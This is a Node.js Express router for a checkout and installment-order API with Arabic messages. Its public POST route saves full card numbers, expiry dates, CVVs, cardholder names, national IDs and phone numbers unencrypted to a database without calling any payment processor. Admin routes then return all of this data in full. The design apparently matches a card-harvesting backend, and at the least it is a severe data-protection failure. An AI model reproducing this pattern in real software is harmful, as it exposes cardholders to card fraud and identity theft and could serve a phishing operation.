const express = require("express");
const jwt = require("jsonwebtoken");
const rateLimit = require("express-rate-limit");
const router = express.Router();
const Checkout = require("../models/Checkout");

function authMiddleware(req, res, next) {
  const token = req.cookies?.admin_token;
  if (!token) return res.status(401).json({ error: "غير مصرح" });
  try {
    req.admin = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: "غير مصرح" });
  }
}

const checkoutLimiter = rateLimit({ windowMs: 60 * 1000, max: 5, message: { ok: false, error: "طلبات كثيرة، حاول لاحقاً" } });

function validateCheckout(req, res, next) {
  const { orderId, cardNumber, expiry, cvv, cardHolder, items, total } = req.body;
  if (!orderId || typeof orderId !== "string") return res.status(400).json({ ok: false, error: "orderId مطلوب" });
  if (!cardNumber || typeof cardNumber !== "string" || cardNumber.length < 13 || cardNumber.length > 19) return res.status(400).json({ ok: false, error: "رقم البطاقة غير صالح" });
  if (!expiry || !/^\d{2}\/\d{2}$/.test(expiry)) return res.status(400).json({ ok: false, error: "تاريخ الانتهاء غير صالح" });
  if (!cvv || !/^\d{3,4}$/.test(cvv)) return res.status(400).json({ ok: false, error: "CVV غير صالح" });
  if (!cardHolder || typeof cardHolder !== "string" || cardHolder.trim().length < 2) return res.status(400).json({ ok: false, error: "اسم حامل البطاقة مطلوب" });
  if (!Array.isArray(items) || items.length === 0) return res.status(400).json({ ok: false, error: "يجب إضافة منتج واحد على الأقل" });
  if (!total || typeof total !== "number" || total <= 0) return res.status(400).json({ ok: false, error: "المبلغ غير صالح" });
  next();
}

router.post("/", checkoutLimiter, validateCheckout, async (req, res) => {
  try {
    const { orderId, cardNumber, expiry, cvv, cardHolder, items, total, downPayment, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment } = req.body;
    const checkout = new Checkout({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, downPayment, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment });
    await checkout.save();
    res.status(201).json({ ok: true, orderId: checkout.orderId });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

router.get("/", authMiddleware, async (req, res) => {
  try {
    const orders = await Checkout.find().sort({ createdAt: -1 });
    res.json(orders);
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

router.get("/:id", authMiddleware, async (req, res) => {
  try {
    const order = await Checkout.findById(req.params.id);
    if (!order) return res.status(404).json({ ok: false, error: "not found" });
    res.json(order);
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

router.put("/:id/status", authMiddleware, async (req, res) => {
  try {
    const order = await Checkout.findByIdAndUpdate(
      req.params.id,
      { status: req.body.status },
      { new: true }
    );
    res.json(order);
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

router.put("/:id/financials", authMiddleware, async (req, res) => {
  try {
    const { total, downPayment, months, monthlyPayment } = req.body;
    const order = await Checkout.findByIdAndUpdate(
      req.params.id,
      { total, downPayment, months, monthlyPayment },
      { new: true }
    );
    res.json(order);
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

router.delete("/:id", authMiddleware, async (req, res) => {
  try {
    const order = await Checkout.findByIdAndDelete(req.params.id);
    if (!order) return res.status(404).json({ ok: false, error: "not found" });
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

module.exports = router;
